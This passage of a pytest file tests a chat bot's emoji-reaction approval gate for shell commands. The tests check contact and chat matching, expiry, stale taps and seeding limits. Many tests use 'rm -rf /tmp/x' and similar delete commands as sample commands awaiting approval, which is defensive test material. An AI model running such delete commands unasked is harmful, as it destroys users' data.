    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="touch /tmp/live-A", session_key="s",
        description="create A",
    )
    await _drain(adapter)

    # Daemon stops accepting the bot's own reactions between the two prompts.
    adapter._reactions_supported = False
    await adapter.send_exec_approval(
        chat_id="42", command="touch /tmp/live-B", session_key="s",
        description="create B",
    )
    await _drain(adapter)

    await adapter._handle_event(_reaction_event("✅", item_id=501))
    await _drain(adapter)

    assert calls == []


@pytest.mark.asyncio
async def test_a_prompt_that_is_not_the_session_current_one_is_refused(
    resolved_approvals,
):
    """Belt-and-braces currency check, independent of the send-side guard."""
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)
    adapter._approval_prompt_by_session["s"] = "999"
    adapter._ws.send.reset_mock()

    await adapter._handle_event(_reaction_event("✅"))
    await _drain(adapter)

    assert calls == []
    assert "no longer pending" in "\n".join(_ws_texts(adapter))


# ---------------------------------------------------------------------------
# 11b. Direct chats only
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_group_approval_never_offers_the_tap_lane():
    """v1 keeps reactions to DMs; groups get the gateway-authorized typed lane."""
    adapter, sent = _approval_adapter()

    result = await adapter.send_exec_approval(
        chat_id="group:7", command="rm -rf /tmp/x", session_key="s",
        description="delete",
    )
    await _drain(adapter)

    assert result.success is True
    assert sent == []  # no anchoring send, no seeded reactions
    assert adapter._approval_prompts_by_item == {}
    prompt = _ws_texts(adapter)[0]
    assert "tap a reaction" not in prompt
    assert "/approve" in prompt


@pytest.mark.asyncio
async def test_group_reaction_resolves_nothing(resolved_approvals):
    """No group prompt is ever registered, so no group tap can resolve one."""
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="group:7", command="rm -rf /tmp/x", session_key="s",
        description="delete",
    )
    await _drain(adapter)

    await adapter._handle_event(
        _reaction_event(
            "✅",
            dir_type="groupRcv",
            member={"memberId": "member-a", "localDisplayName": "alice"},
            chat_info={"type": "group", "groupInfo": {"groupId": 7}},
        )
    )
    await _drain(adapter)

    assert calls == []


@pytest.mark.asyncio
async def test_group_member_reaction_on_a_dm_prompt_is_ignored(resolved_approvals):
    """A member id is not a contact id — never let the namespaces collide.

    ``localDisplayName`` is attacker-chosen, and a member id lives in a
    different namespace from the contact id a DM prompt is keyed on, so a
    group-directed reaction can never authorize a DM approval.
    """
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    await adapter._handle_event(
        _reaction_event(
            "✅",
            dir_type="groupRcv",
            member={"memberId": "42", "localDisplayName": "42"},
        )
    )
    await _drain(adapter)

    assert calls == []
    assert adapter._approval_prompts_by_item  # still pending


@pytest.mark.asyncio
async def test_reaction_from_another_contact_is_ignored(resolved_approvals):
    """Fail closed: only the contact whose DM raised the approval may answer."""
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    await adapter._handle_event(_reaction_event("✅", contact_id=99))
    assert calls == []
    assert adapter._approval_prompts_by_item  # still pending


@pytest.mark.asyncio
async def test_reaction_from_another_chat_is_ignored(resolved_approvals):
    """The event's own chat must match the chat the prompt was posted in."""
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    await adapter._handle_event(
        _reaction_event("✅", chat_info={"type": "group", "groupInfo": {"groupId": 7}})
    )
    assert calls == []
    assert adapter._approval_prompts_by_item


def test_group_chat_ref_requires_a_numeric_id():
    """Group refs get the same numeric validation contact refs already get."""
    assert SimplexAdapter._chat_ref("group:7") == "#7"
    assert SimplexAdapter._chat_ref("group:friends") is None
    assert SimplexAdapter._chat_ref("group:") is None


# ---------------------------------------------------------------------------
# 11c. Resolving a tap
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_reaction_resolves_pending_approval(resolved_approvals):
    calls, _state = resolved_approvals
    adapter, sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="simplex:42",
        description="delete",
    )
    await _drain(adapter)

    await adapter._handle_event(_reaction_event("✅"))
    await _drain(adapter)

    assert calls == [("simplex:42", "once")]
    # State is retired and the bot's own seeds are toggled back off.
    assert adapter._approval_prompts_by_item == {}
    assert adapter._approval_prompt_by_session == {}
    assert len(_reaction_commands(sent, toggle="off")) == len(_choice_table())


@pytest.mark.asyncio
async def test_reaction_variation_selector_is_normalized(resolved_approvals):
    """❤ arrives with and without U+FE0F depending on the client."""
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    await adapter._handle_event(_reaction_event("❤️"))
    assert calls == [("s", "always")]


@pytest.mark.asyncio
async def test_thumbs_up_is_accepted_as_approve_once(resolved_approvals):
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    await adapter._handle_event(_reaction_event("👍"))
    assert calls == [("s", "once")]


@pytest.mark.asyncio
async def test_own_seed_echo_does_not_resolve(resolved_approvals):
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    await adapter._handle_event(_reaction_event("✅", dir_type="directSnd"))
    assert calls == []


@pytest.mark.asyncio
async def test_removing_a_reaction_does_not_resolve(resolved_approvals):
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    await adapter._handle_event(_reaction_event("✅", added=False))
    assert calls == []


@pytest.mark.asyncio
async def test_unmapped_reaction_explains_itself_once(resolved_approvals):
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)
    adapter._ws.send.reset_mock()

    await adapter._handle_event(_reaction_event("😂"))
    await adapter._handle_event(_reaction_event("😢"))

    assert calls == []
    # One explanatory reply, not one per stray reaction.
    assert adapter._ws.send.call_count == 1


@pytest.mark.asyncio
async def test_a_tier_the_prompt_did_not_offer_is_refused(resolved_approvals):
    """The emoji map is global; the offer is per-prompt.

    ❤ is not seeded on a prompt that disallows the permanent tier, but the
    user can still place it by hand — and core would have refused it, so
    acknowledging "approved permanently" would be a lie told by a security UI.
    """
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42",
        command="rm -rf /tmp/x",
        session_key="s",
        description="delete",
        allow_permanent=False,
    )
    await _drain(adapter)
    adapter._ws.send.reset_mock()

    await adapter._handle_event(_reaction_event("❤"))
    await _drain(adapter)

    assert calls == []
    assert "not one of the approval options" in "\n".join(_ws_texts(adapter))
    assert "permanent" not in "\n".join(_ws_texts(adapter))


@pytest.mark.asyncio
async def test_stale_tap_is_told_the_command_did_not_run(resolved_approvals):
    """resolve returning 0 means the queue was already drained (#63501)."""
    calls, state = resolved_approvals
    state["count"] = 0
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)
    adapter._ws.send.reset_mock()

    await adapter._handle_event(_reaction_event("✅"))
    await _drain(adapter)

    assert calls == [("s", "once")]
    reply = "\n".join(_ws_texts(adapter))
    assert "no longer pending" in reply
    assert "Approved" not in reply


@pytest.mark.asyncio
async def test_expired_prompt_is_retired_without_resolving(resolved_approvals):
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)
    adapter._approval_prompts_by_item["501"].expires_at = 0.0
    adapter._ws.send.reset_mock()

    await adapter._handle_event(_reaction_event("✅"))
    await _drain(adapter)

    assert calls == []
    assert adapter._approval_prompts_by_item == {}
    assert "expired" in "\n".join(_ws_texts(adapter))


@pytest.mark.asyncio
async def test_expiry_notice_is_not_a_stranger_operated_megaphone(
    resolved_approvals,
):
    """Authorization runs before expiry, so an outsider cannot make us post."""
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)
    adapter._approval_prompts_by_item["501"].expires_at = 0.0
    adapter._ws.send.reset_mock()

    await adapter._handle_event(_reaction_event("✅", contact_id=99))
    await _drain(adapter)

    assert calls == []
    assert adapter._ws.send.call_count == 0
    assert adapter._approval_prompts_by_item  # untouched by the outsider


@pytest.mark.asyncio
async def test_malformed_reaction_payload_is_ignored():
    """A type guard has to run before the access it guards, not after."""
    adapter, _sent = _approval_adapter()

    await adapter._handle_reaction_event(
        {"type": "chatItemReaction", "added": True, "reaction": ["not-a-dict"]}
    )
    await adapter._handle_reaction_event(
        {"type": "chatItemReaction", "added": True, "reaction": {
            "chatReaction": ["not-a-dict"]
        }}
    )


# ---------------------------------------------------------------------------
# 11d. Seeding and degradation
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_exec_approval_degrades_when_daemon_rejects_reactions():
    """A daemon that refuses reactions leaves the typed flow, not a broken one."""
    adapter, sent = _approval_adapter(
        reaction_response={"type": "chatCmdError", "chatError": {}}
    )

    first = await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/a", session_key="s1", description="delete"
    )
    await _drain(adapter)

    assert first.success is True
    assert adapter._reactions_supported is False
    # Exactly one attempt, then it stops trying.
    assert len(_reaction_commands(sent)) == 1
    assert "/approve" in "\n".join(_ws_texts(adapter))

    sent.clear()
    adapter._ws.send.reset_mock()
    second = await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/b", session_key="s2", description="delete"
    )
    await _drain(adapter)

    assert second.success is True
    # No further seeding attempts, and nothing advertised that is not there.
    assert _reaction_commands(sent) == []
    assert "tap a reaction" not in _prompt_text(sent)
    assert "/approve" in _prompt_text(sent)


@pytest.mark.asyncio
async def test_seed_rejection_keeps_the_inbound_reaction_lane(resolved_approvals):
    """'The bot may not react' and 'the user may not react' are not the same.

    A daemon that refuses the bot's own reactions has said nothing about a
    reaction the user places, so the prompt stays anchored and registered.
    """
    calls, _state = resolved_approvals
    adapter, sent = _approval_adapter(
        reaction_response={"type": "chatCmdError", "chatError": {}}
    )
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/a", session_key="s1", description="delete"
    )
    await _drain(adapter)
    assert adapter._reactions_supported is False

    adapter._next_item_id = 777
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/b", session_key="s2", description="delete"
    )
    await _drain(adapter)

    assert "777" in adapter._approval_prompts_by_item
    await adapter._handle_event(_reaction_event("✅", item_id=777))
    await _drain(adapter)
    assert calls == [("s2", "once")]


@pytest.mark.asyncio
async def test_one_refused_emoji_does_not_kill_the_whole_lane():
    """Only a rejection of the first, always-valid emoji means 'no reactions'.

    ✅ is on the daemon's own allowlist, so a rejection there is about
    reactions in general. A rejection further down the list is about that one
    emoji and must not disable the feature process-wide.
    """
    adapter, sent = _approval_adapter(reject_emoji="🚀")

    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/a", session_key="s", description="delete"
    )
    await _drain(adapter)

    assert adapter._reactions_supported is True
    attempted = {_reaction_emoji(c) for c in _reaction_commands(sent)}
    assert attempted == {"👎", "✅", "🚀"}
    assert adapter._approval_prompts_by_item["501"].seeded_emoji == ["👎", "✅"]
    legend = [t for t in _ws_texts(adapter) if "tap a reaction" in t][0]
    assert "🚀" not in legend


@pytest.mark.asyncio
async def test_a_seed_that_lands_after_resolution_is_taken_back_off():
    """No bot reaction may outlive the prompt it decorates.

    A leftover ✅ on a resolved prompt is a live-looking tap target on a
    message that can no longer answer for itself.
    """
    adapter, _sent = _approval_adapter()
    prompt = _simplex._SimplexApprovalPrompt(
        session_key="s",
        chat_id="42",
        chat_ref="@42",
        item_id="501",
        choices=frozenset({"once", "deny"}),
        expires_at=time.monotonic() + 300,
    )
    gate = asyncio.Event()
    calls = []

    async def fake_set_reaction(chat_ref, item_id, emoji, *, add=True):
        calls.append((emoji, add))
        if add:
            await gate.wait()
        return _simplex._REACTION_ACCEPTED

    adapter._set_reaction = fake_set_reaction
    task = asyncio.create_task(
        adapter._seed_approval_reactions(prompt, _choice_table()[:1])
    )
    await asyncio.sleep(0)

    adapter._retire_prompt(prompt)
    gate.set()
    await task
    await _drain(adapter)

    assert (_choice_table()[0][0], False) in calls
    assert prompt.seeded_emoji == []


# ---------------------------------------------------------------------------
# 11e. The daemon's three-reaction cap
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_only_three_tap_targets_are_seeded_and_deny_goes_first():
    """The daemon holds three reactions per sender, so we ask for three.

    Measured against simplex-chat v7.0.0.11: seeding a fourth emoji comes
    back ``commandError: "too many reactions"``. Seeding four meant the
    fourth silently vanished — and it was 👎, the one choice a user must
    never lose.
    """
    adapter, sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    seeded = [_reaction_emoji(c) for c in _reaction_commands(sent)]
    assert len(seeded) == 3
    assert seeded[0] == "👎"
    assert set(seeded) == {"👎", "✅", "🚀"}
    assert "❤" not in seeded


@pytest.mark.asyncio
async def test_approve_always_is_typed_only_but_still_read_inbound(
    resolved_approvals,
):
    """❤ is never seeded and never advertised, and still works by hand.

    "Always" writes a permanent, global, on-disk allowlist entry — the most
    consequential tier on the prompt — so it costs a typed command rather
    than one tap.
    """
    calls, _state = resolved_approvals
    adapter, sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    assert "❤" not in {_reaction_emoji(c) for c in _reaction_commands(sent)}
    everything = _prompt_text(sent) + "\n".join(_ws_texts(adapter))
    assert "❤" not in everything
    # The typed route to the same tier is still spelled out.
    assert "approve always" in _prompt_text(sent)

    await adapter._handle_event(_reaction_event("❤️"))
    assert calls == [("s", "always")]


@pytest.mark.asyncio
async def test_a_reaction_cap_never_costs_the_deny_target():
    """A cap hit while seeding must not be the thing that removes 👎."""
    adapter, sent = _approval_adapter(reaction_cap=2)
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    prompt = adapter._approval_prompts_by_item["501"]
    assert "👎" in prompt.seeded_emoji
    assert len(prompt.seeded_emoji) == 2
    # A cap is not a refusal: the daemon still takes reactions from us.
    assert adapter._reactions_supported is True
    # Seeding stops at the cap instead of hammering the daemon.
    assert len(_reaction_commands(sent)) == 3


@pytest.mark.asyncio
async def test_the_legend_lists_only_the_reactions_that_landed():
    """The bot may never advertise a tap the user cannot see."""
    adapter, sent = _approval_adapter(reaction_cap=2)
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    landed = adapter._approval_prompts_by_item["501"].seeded_emoji
    legend = [t for t in _ws_texts(adapter) if "tap a reaction" in t]
    assert len(legend) == 1
    advertised = [e for e in ("👎", "✅", "🚀", "❤") if f"{e} = " in legend[0]]
    assert advertised == landed


@pytest.mark.asyncio
async def test_no_legend_when_nothing_could_be_seeded():
    """A daemon that placed no reaction gets no "tap a reaction" line."""
    adapter, _sent = _approval_adapter(reaction_cap=0)
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    assert [t for t in _ws_texts(adapter) if "tap a reaction" in t] == []
    assert adapter._approval_prompts_by_item["501"].seeded_emoji == []


# ---------------------------------------------------------------------------
# 11f. Our own sends do not ride the broken DM text path
# ---------------------------------------------------------------------------


def _bare_dm_frames(adapter):
    """Frames sent as ``@<numeric id> <text>`` — the path that drops silently.

    The daemon reads ``@x`` as a display-name lookup and answers
    ``contactNotFound`` for any contact whose display name is not literally
    its numeric id, while the send still reports success. Nothing in the
    approval flow may depend on it.
    """
    return [
        cmd for cmd in _ws_frames(adapter)
        if cmd.startswith("@") and cmd.split(" ", 1)[0][1:].isdigit()
    ]


@pytest.mark.asyncio
async def test_the_tap_acknowledgement_uses_the_structured_send_form(
    resolved_approvals,
):
    """A tap that resolves must produce a message the user actually sees."""
    _calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)
    adapter._ws.send.reset_mock()

    await adapter._handle_event(_reaction_event("✅"))
    await _drain(adapter)

    acks = [t for t in _ws_texts(adapter) if "Approved" in t]
    assert acks == ["✅ Approved — running this once."]
    assert _bare_dm_frames(adapter) == []
    assert all(
        cmd.startswith("/_send @42 json ") for cmd in _ws_frames(adapter)
    )


@pytest.mark.asyncio
async def test_every_approval_notice_uses_the_structured_send_form(
    resolved_approvals,
):
    """Supersede, expiry, stale tap and bad-reaction replies, all of them."""
    _calls, state = resolved_approvals
    adapter, sent = _approval_adapter()

    # Supersede notice + the typed prompt that replaces the tap lane.
    await _two_prompts_one_session(adapter, sent)
    # Bad-reaction feedback on the second (typed) prompt's predecessor.
    adapter._next_item_id = 888
    adapter._typed_only_sessions.clear()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/y", session_key="s2", description="delete"
    )
    await _drain(adapter)
    await adapter._handle_event(_reaction_event("😂", item_id=888))
    # Expiry notice.
    adapter._approval_prompts_by_item["888"].expires_at = time.monotonic() - 1
    await adapter._handle_event(_reaction_event("✅", item_id=888))
    # Stale tap: nothing left pending.
    adapter._next_item_id = 999
    adapter._typed_only_sessions.clear()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/z", session_key="s3", description="delete"
    )
    await _drain(adapter)
    state["count"] = 0
    await adapter._handle_event(_reaction_event("✅", item_id=999))
    await _drain(adapter)

    joined = "\n".join(_ws_texts(adapter))
    assert "superseded" in joined
    assert "not one of the approval options" in joined
    assert "expired" in joined
    assert "no longer pending" in joined
    assert _bare_dm_frames(adapter) == []


@pytest.mark.asyncio
async def test_the_daemon_refusal_notice_uses_the_structured_send_form():
    """Even the "this daemon will not let me react" line has to arrive."""
    adapter, _sent = _approval_adapter(
        reaction_response={"type": "chatCmdError", "chatError": {}}
    )
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    assert "does not let me place" in "\n".join(_ws_texts(adapter))
    assert _bare_dm_frames(adapter) == []
